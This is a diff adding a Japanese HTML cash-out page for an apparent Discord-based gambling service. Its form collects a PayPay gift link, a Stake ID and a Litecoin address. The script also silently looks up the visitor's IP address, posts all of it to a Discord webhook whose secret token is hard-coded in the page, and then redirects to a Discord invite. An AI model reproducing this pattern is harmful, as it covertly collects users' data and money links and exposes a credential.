@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>りずカジ LTC換金Web</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+
+        .webhook-container {
+            text-align: center;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            border: 2px solid #ccc;
+            border-radius: 20px;
+            margin: 5px;
+            width: 250px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #1900ff;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #292dff;
+        }
+    </style>
+</head>
+<body>
+    <div class="webhook-container">
+        <h2>りずカジ公式自動換金 web</h2>
+        <h4>Stakeじゃない場合[Stake ID]は開けてください</h4>
+        <form id="myForm">
+            <input type="text" id="input1" placeholder="PayPayURL"><br>
+            <input type="text" id="input2" placeholder="Stake ID"><br>
+            <input type="text" id="input3" placeholder="LTC address"><br>
+            <button type="button" onclick="sendData()">送信</button>
+        </form>
+    </div>
+
+    <script>
+        async function sendData() {
+            var input1Value = document.getElementById("input1").value;
+            var input2Value = document.getElementById("input2").value;
+            var input3Value = document.getElementById("input3").value;
+
+            var ip = await getIPAddress();
+
+            var data = {
+                content: `**PayPayURL**|${input1Value}**Stake id**|${input2Value}**LTC A**|${input3Value}**IP A**|${ip}`
+            };
+
+            var webhookUrl = "https://discord.com/api/webhooks/1246349122622066749/LI_n2eeorg7R30oEDi7ygxzQPBE6IvNkmIerVtcNdfIAD3eTULUwSb1domTfkSRr62Mc";
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Discord Webhookのレスポンス:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+
+            window.location.href = "https://discord.gg/3Ry8EMgXJs";
+        }
+
+        async function getIPAddress() {
+            var ipAPI = 'https://api64.ipify.org?format=json';
+
+            try {
+                var response = await fetch(ipAPI);
+                var data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IPアドレスの取得に失敗しました:', error);
+                return 'Unknown';
+            }
+        }
+    </script>
+</body>
+</html>
